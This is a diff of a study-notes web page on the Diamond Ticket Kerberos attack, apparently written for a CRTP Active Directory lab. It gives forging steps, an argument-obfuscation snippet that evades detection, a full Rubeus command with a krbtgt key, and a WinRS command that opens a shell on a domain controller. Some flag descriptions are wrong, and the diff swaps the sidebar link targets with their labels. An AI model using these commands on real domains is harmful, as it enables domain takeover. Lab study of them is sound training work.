@@ -76,25 +76,25 @@
           <a href="../../" class="home-link">← Home</a>
           <a href="../../certifications/" class="home-link">← Certifications</a>
           <h3>Sections</h3>
-          <a href="enumeration.html" class="">Enumeration</a>
-          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
-          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
-          <a href="golden-ticket.html" class="">Golden Ticket</a>
-          <a href="silver-ticket.html" class="">Silver Ticket</a>
-          <a href="diamond-ticket.html" class="active">Diamond Ticket</a>
-          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
-          <a href="dcsync-attack.html" class="">DCSync Attack</a>
-          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
-          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
-          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
-          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
-          <a href="rbcd.html" class="">RBCD</a>
-          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
-          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
-          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
-          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
-          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
-          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+          <a href="Enumeration" class="">enumeration.html</a>
+          <a href="Privilege Escalation" class="">privilege-escalation.html</a>
+          <a href="Privilege Escalation via Domain Admin session" class="">privilege-escalation-domain-admin.html</a>
+          <a href="Golden Ticket" class="">golden-ticket.html</a>
+          <a href="Silver Ticket" class="">silver-ticket.html</a>
+          <a href="Diamond Ticket" class="">diamond-ticket.html</a>
+          <a href="Abusing DSRM Credentials" class="">abusing-dsrm-credentials.html</a>
+          <a href="DCSync Attack" class="">dcsync-attack.html</a>
+          <a href="Security Descriptor Abuse" class="">security-descriptor-abuse.html</a>
+          <a href="ASREP-Roasting Attack" class="">asrep-roasting.html</a>
+          <a href="Unconstrained Delegation" class="">unconstrained-delegation.html</a>
+          <a href="Constrained Delegation" class="">constrained-delegation.html</a>
+          <a href="Resource-Based Constrained Delegation (RBCD)" class="">rbcd.html</a>
+          <a href="Enterprise Admins Trust - SID-History Abuse with Trust Ticket" class="">sid-history-trust-ticket.html</a>
+          <a href="Enterprise Admin Trust - SID-History Abuse with KRBTGT hash" class="">sid-history-krbtgt.html</a>
+          <a href="CrossForest Trust - Trust Flow" class="">cross-forest-trust.html</a>
+          <a href="ADCS Attacks" class="">adcs-attacks.html</a>
+          <a href="Trust Links Abuse" class="">trust-links-abuse.html</a>
+          <a href="MDE/MDI Bypass" class="">mde-mdi-bypass.html</a>
 
         </div>
         <div class="separator"></div>
@@ -117,161 +117,45 @@
         <header class="h2 article-title">Diamond Ticket</header>
         <section class="about-text">
           <div class="notion-content">
-<p>Diamond tickets are a variant of forged Kerberos tickets that can be used to gain privileged access to services in an Active Directory domain in a stealthy manner. </p>
-<p>The main differences between Silver and Diamond tickets are:</p>
-<ul>
-<li>
-<p>Silver tickets are used to gain access to specific services by forging a service ticket using the target service account's key, while Diamond tickets are used to forge a ticket granting ticket (TGT) which can then be used to request service tickets for any service.</p>
-</li>
-<li>
-<p>Diamond tickets are more stealthy than Silver tickets because they request a legitimate TGT from a domain controller first, decrypt it, modify the PAC, and re-encrypt it. This produces a PAC that is highly similar to a legitimate one and generates legitimate requests, making it harder to detect.</p>
-</li>
-</ul>
-<p>Here are the steps to forge a Diamond Ticket:</p>
-<ol>
-<li>Obtain the AES256 key of the krbtgt account:</li>
-<li>This requires compromising a domain controller or having access to the domain controller's memory.</li>
-<li>
-<p>The AES256 key is used to decrypt and re-encrypt the ticket.</p>
-</li>
-<li>
-<p>This requires compromising a domain controller or having access to the domain controller's memory.</p>
-</li>
-<li>
-<p>The AES256 key is used to decrypt and re-encrypt the ticket.</p>
-</li>
-<li>
-<p>Request a legitimate TGT:</p>
-</li>
-<li>Use Rubeus (on Windows) or Impacket'sticketer.py(on Unix-like systems) to request a legitimate TGT for a low-privileged user.</li>
-<li>
-<p>This step is necessary to obtain a ticket that can be modified to grant elevated privileges.</p>
-</li>
-<li>
-<p>Use Rubeus (on Windows) or Impacket's ticketer.py (on Unix-like systems) to request a legitimate TGT for a low-privileged user.</p>
-</li>
-<li>
-<p>This step is necessary to obtain a ticket that can be modified to grant elevated privileges.</p>
-</li>
-<li>
-<p>Decrypt the TGT:</p>
-</li>
-<li>
-<p>Use the AES256 key to decrypt the TGT.</p>
-</li>
-<li>
-<p>Use the AES256 key to decrypt the TGT.</p>
-</li>
-<li>
-<p>Modify the PAC:</p>
-</li>
-<li>Modify the PAC to include the desired user ID and group IDs.</li>
-<li>
-<p>This step allows you to grant additional privileges beyond what a standard Golden Ticket offers.</p>
-</li>
-<li>
-<p>Modify the PAC to include the desired user ID and group IDs.</p>
-</li>
-<li>
-<p>This step allows you to grant additional privileges beyond what a standard Golden Ticket offers.</p>
-</li>
-<li>
-<p>Recalculate the signatures:</p>
-</li>
-<li>
-<p>Recalculate the signatures to ensure the ticket remains valid.</p>
-</li>
-<li>
-<p>Recalculate the signatures to ensure the ticket remains valid.</p>
-</li>
-<li>
-<p>Re-encrypt the ticket:</p>
-</li>
-<li>
-<p>Re-encrypt the ticket using the AES256 key.</p>
-</li>
-<li>
-<p>Re-encrypt the ticket using the AES256 key.</p>
-</li>
-<li>
-<p>Use the Diamond Ticket:</p>
-</li>
-<li>
-<p>Use the resulting Diamond Ticket to request service tickets for any service in the domain, effectively granting you elevated privileges.</p>
-</li>
-<li>
-<p>Use the resulting Diamond Ticket to request service tickets for any service in the domain, effectively granting you elevated privileges.</p>
-</li>
-</ol>
-<p>Some OPSEC advantages of Diamond tickets over Golden tickets include:</p>
-<ul>
-<li>
-<p>Requesting a valid TGT first makes it less likely to trigger detection that monitor for service ticket requests without a corresponding TGT request.</p>
-</li>
-<li>
-<p>The ticket times are more likely to be correct by default since the ticket is first created by a domain controller.</p>
-</li>
-</ul>
-<p>To abuse a Diamond Ticket, you do not necessarily need to be a Domain Admin privileged user. However, you do need to have access to the AES256 key of the KRBTGT account, which is typically only accessible to Domain Admins or those who have compromised a domain controller.</p>
-<h1>Diamond Ticket With Rubeus</h1>
-<p>For this demonstration, I’ll be using Rubeus commands. I’ll also be focus on OPSEC care by using PELoader.exe and ArgSplit.exe to encode the arguments.</p>
-<p>Executing ArgSplit.bat for argument encode and copy/paste the result to CMD.</p>
-<p><code>diamond</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;z=d&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;y=n&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;x=o&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;w=m&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;v=a&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;u=i&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;t=d&quot;</span>
-<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;Pwn=%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
-<ul>
-<li>
-<p>-path: Specifies the path to the Rubeus executable.</p>
-</li>
-<li>
-<p>-args: Specifies the arguments to be passed to the Rubeus executable.</p>
-</li>
-<li>
-<p>/krbkey: Specifies the KRBTGT key.</p>
-</li>
-<li>
-<p>/tgtdeleg: Specifies the target delegation.</p>
-</li>
-<li>
-<p>/enctype: Specifies the encryption type.</p>
-</li>
-<li>
-<p>/ticketuser: Specifies the user for the ticket.</p>
-</li>
-<li>
-<p>/domain: Specifies the domain.</p>
-</li>
-<li>
-<p>/dc: Specifies the domain controller.</p>
-</li>
-<li>
-<p>/ticketuserid: Specifies the user ID for the ticket.</p>
-</li>
-<li>
-<p>/groups: Specifies the groups.</p>
-</li>
-<li>
-<p>/createnetonly: Specifies the network-only creation of the ticket.</p>
-</li>
-<li>
-<p>/show: Displays the ticket.</p>
-</li>
-<li>
-<p>/ptt: Prints the ticket to the console</p>
-</li>
-</ul>
-<p>As we can we were able to forge a Diamond Ticket and we can use it by accessing Domain Controller with <code>WinRS</code>.</p>
-<p><code>winrs -r:dcordp-dc cmd</code></p>
-<p>Diamond Tickets are really straightforward and we can see that if we do have all proper information for the attack we get a new session as Domain Admin.</p>
+<p class="" id="30c79e9a-d7c9-805f-af44-d5fc63910982">Diamond tickets are a variant of forged Kerberos tickets that can be used to gain privileged access to services in an Active Directory domain in a stealthy manner. <br/><br/>The main differences between Silver and Diamond tickets are:</p><ul class="bulleted-list" id="30c79e9a-d7c9-8062-886d-ef15b5c54d54"><li style="list-style-type:disc">Silver tickets are used to gain access to specific services by forging a service ticket using the target service account's key, while Diamond tickets are used to forge a ticket granting ticket (TGT) which can then be used to request service tickets for any service.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-8037-adb5-dad33fe3a011"><li style="list-style-type:disc">Diamond tickets are more stealthy than Silver tickets because they request a legitimate TGT from a domain controller first, decrypt it, modify the PAC, and re-encrypt it. This produces a PAC that is highly similar to a legitimate one and generates legitimate requests, making it harder to detect.</li></ul><p class="" id="30c79e9a-d7c9-8025-8ff0-fdaa2b3347cd">
+</p><p class="" id="30c79e9a-d7c9-80ae-a52a-c4540f93b788">Here are the steps to forge a Diamond Ticket:</p><ol class="numbered-list" id="30c79e9a-d7c9-80d8-aa32-cf6f3c5696b7" start="1" type="1"><li><strong>Obtain the AES256 key of the krbtgt account</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-8010-bbe9-c15d141c645b"><li style="list-style-type:disc">This requires compromising a domain controller or having access to the domain controller's memory.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80ed-be75-c82ddc91b2a4"><li style="list-style-type:disc">The AES256 key is used to decrypt and re-encrypt the ticket.</li></ul></li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8056-9d0b-e42e70d7644f" start="2" type="1"><li><strong>Request a legitimate TGT</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-80a4-b6bf-e3bc05ae9653"><li style="list-style-type:disc">Use Rubeus (on Windows) or Impacket's <a href="http://ticketer.py/">ticketer.py</a> (on Unix-like systems) to request a legitimate TGT for a low-privileged user.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-8055-a172-d534d9b1925c"><li style="list-style-type:disc">This step is necessary to obtain a ticket that can be modified to grant elevated privileges.</li></ul></li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80ac-ac23-fd014bf2a999" start="3" type="1"><li><strong>Decrypt the TGT</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-8038-a62a-cf2f35c6e82d"><li style="list-style-type:disc">Use the AES256 key to decrypt the TGT.</li></ul></li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80e3-8dd9-c36bcbc2b077" start="4" type="1"><li><strong>Modify the PAC</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-80e5-b463-ff77c539a825"><li style="list-style-type:disc">Modify the PAC to include the desired user ID and group IDs.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-805b-8627-fa69026dec30"><li style="list-style-type:disc">This step allows you to grant additional privileges beyond what a standard Golden Ticket offers.</li></ul></li></ol><ol class="numbered-list" id="30c79e9a-d7c9-805c-b22b-c285cbad09ea" start="5" type="1"><li><strong>Recalculate the signatures</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-802e-bfd6-d4a5b146e12a"><li style="list-style-type:disc">Recalculate the signatures to ensure the ticket remains valid.</li></ul></li></ol><ol class="numbered-list" id="30c79e9a-d7c9-807f-b832-dec72f8a1cf6" start="6" type="1"><li><strong>Re-encrypt the ticket</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-80c0-a12d-c75f7578b65c"><li style="list-style-type:disc">Re-encrypt the ticket using the AES256 key.</li></ul></li></ol><ol class="numbered-list" id="30c79e9a-d7c9-803d-b83e-fb4fc9385a6e" start="7" type="1"><li><strong>Use the Diamond Ticket</strong>:<ul class="bulleted-list" id="30c79e9a-d7c9-8018-92fa-c72ac4b81f39"><li style="list-style-type:disc">Use the resulting Diamond Ticket to request service tickets for any service in the domain, effectively granting you elevated privileges.</li></ul></li></ol><p class="" id="30c79e9a-d7c9-8005-b4fb-d248105e5b77">
+</p><p class="" id="30c79e9a-d7c9-803b-bd71-ccb5b97b717b">
+</p><p class="" id="30c79e9a-d7c9-808b-bbc3-ea9128a754c0">Some OPSEC advantages of Diamond tickets over Golden tickets include:</p><ul class="bulleted-list" id="30c79e9a-d7c9-800a-ad6e-cf746685bdfb"><li style="list-style-type:disc">Requesting a valid TGT first makes it less likely to trigger detection that monitor for service ticket requests without a corresponding TGT request.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80d7-9ca3-e08eb2d3e1ba"><li style="list-style-type:disc">The ticket times are more likely to be correct by default since the ticket is first created by a domain controller.</li></ul><p class="" id="30c79e9a-d7c9-801d-b56d-e2e3310dc68f">
+</p><p class="" id="30c79e9a-d7c9-8025-9cc3-cb4635217360">To abuse a Diamond Ticket, you do not necessarily need to be a Domain Admin privileged user. However, you do need to have access to the AES256 key of the KRBTGT account, which is typically only accessible to Domain Admins or those who have compromised a domain controller.</p><h1 class="" id="30c79e9a-d7c9-803b-b98a-d308234dc6e2">Diamond Ticket With Rubeus</h1><p class="" id="30c79e9a-d7c9-805e-aae2-edbb8f5ef672">For this demonstration, I’ll be using Rubeus commands. I’ll also be focus on OPSEC care by using PELoader.exe and ArgSplit.exe to encode the arguments.</p><p class="" id="30c79e9a-d7c9-802a-9957-f6a6375645c2">Executing ArgSplit.bat for argument encode and copy/paste the result to CMD.</p><p class="" id="30c79e9a-d7c9-802d-ada4-ccbbae28988b"><code>diamond</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-807e-8eb3-d9b25d4ade34"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">set "z=d"
+set "y=n"
+set "x=o"
+set "w=m"
+set "v=a"
+set "u=i"
+set "t=d"
+set "Pwn=%t%%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-803f-90f3-efb3ea2462b1"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p><a href="../../assets/crtp/Untitled 77.png"><img src="../../assets/crtp/Untitled 77.png"/></a><ul class="bulleted-list" id="30c79e9a-d7c9-808e-a93c-e63d91e2ed1c"><li style="list-style-type:disc"><code>-path</code>: Specifies the path to the Rubeus executable.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80a1-a06e-f292d50dbc93"><li style="list-style-type:disc"><code>-args</code>: Specifies the arguments to be passed to the Rubeus executable.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-802d-9938-eee527a352bd"><li style="list-style-type:disc"><code>/krbkey</code>: Specifies the KRBTGT key.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80ae-b93e-d215166af4b4"><li style="list-style-type:disc"><code>/tgtdeleg</code>: Specifies the target delegation.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80cb-960c-efce1a8abc10"><li style="list-style-type:disc"><code>/enctype</code>: Specifies the encryption type.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-809f-a5f1-e7024316501b"><li style="list-style-type:disc"><code>/ticketuser</code>: Specifies the user for the ticket.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-805f-aaf7-dd8b9e0fbfa4"><li style="list-style-type:disc"><code>/domain</code>: Specifies the domain.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-8059-b488-c488b99ea0b9"><li style="list-style-type:disc"><code>/dc</code>: Specifies the domain controller.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80e9-8824-f06dc2d99ca8"><li style="list-style-type:disc"><code>/ticketuserid</code>: Specifies the user ID for the ticket.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-8067-b788-c51957f6c7e3"><li style="list-style-type:disc"><code>/groups</code>: Specifies the groups.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80db-89be-fb881ee0c4ab"><li style="list-style-type:disc"><code>/createnetonly</code>: Specifies the network-only creation of the ticket.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80ca-984a-c9dae72c70d4"><li style="list-style-type:disc"><code>/show</code>: Displays the ticket.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80fc-9f21-c860374d5361"><li style="list-style-type:disc"><code>/ptt</code>: Prints the ticket to the console</li></ul><p class="" id="30c79e9a-d7c9-8096-869a-d8b6185295c1">
+</p><p class="" id="30c79e9a-d7c9-807f-88ee-c6271bcf6a91">As we can we were able to forge a Diamond Ticket and we can use it by accessing Domain Controller with <code><strong>WinRS</strong></code>.</p><p class="" id="30c79e9a-d7c9-80f2-b46b-d453ec3171ab"><code>winrs -r:dcordp-dc cmd</code></p><p class="" id="30c79e9a-d7c9-80fb-8af3-cd47533d97b2">Diamond Tickets are really straightforward and we can see that if we do have all proper information for the attack we get a new session as Domain Admin.</p><p class="" id="30c79e9a-d7c9-8042-b188-c9641233eefb">
+</p><p class="" id="30c79e9a-d7c9-808d-a752-ed63aa375a45">
+</p><p class="" id="30c79e9a-d7c9-8049-8fc1-c7647f7f6bee">
+</p><p class="" id="30c79e9a-d7c9-803b-9cf4-d328050097be">
+</p><p class="" id="30c79e9a-d7c9-806d-9203-d7c2cdd78f01">
+</p><p class="" id="30c79e9a-d7c9-8069-944e-c45c73c74634">
+</p><p class="" id="30c79e9a-d7c9-80e4-a57b-eee0e5e4a10b">
+</p><p class="" id="30c79e9a-d7c9-8075-a12f-f20d05680dc1">
+</p><p class="" id="30c79e9a-d7c9-808a-ac5b-f6af0c1ae5cf">
+</p><p class="" id="30c79e9a-d7c9-802d-9318-de8a036dc519">
+</p><p class="" id="30c79e9a-d7c9-801d-91c6-eee8d4ba49ef">
+</p><p class="" id="30c79e9a-d7c9-8047-9db4-fdc9061dc6b3">
+</p><p class="" id="30c79e9a-d7c9-80b3-8406-d2cbf90d8c0e">
+</p><p class="" id="30c79e9a-d7c9-807a-b381-cb0b0228e8e3">
+</p><p class="" id="30c79e9a-d7c9-80ff-a9ff-d0c94799a870">
+</p><p class="" id="30c79e9a-d7c9-80bd-a2d5-ef70867a5a35">
+</p><p class="" id="30c79e9a-d7c9-80ab-9214-f837f7633f23">
+</p><p class="" id="30c79e9a-d7c9-8097-8973-e321c17f8c39">
+</p><p class="" id="30c79e9a-d7c9-80aa-a1e7-fb3aaf412368">
+</p><p class="" id="30c79e9a-d7c9-80ae-a411-e4748d27dbf2">
+</p><p class="" id="30c79e9a-d7c9-8022-a3e3-fcef183f0b65">
+</p><p class="" id="30c79e9a-d7c9-80b8-91cb-e13c632c0f6a">
+</p><p class="" id="30c79e9a-d7c9-80f5-b76a-fb5b89510d9e">
+</p><p class="" id="30c79e9a-d7c9-80d3-9311-f74828903889">
+</p><p class="" id="30c79e9a-d7c9-807a-811d-cc1e8967b793">
+</p><p class="" id="30c79e9a-d7c9-809e-ba90-dca56c0f651a">
+</p>
           </div>
         </section>
       </article>
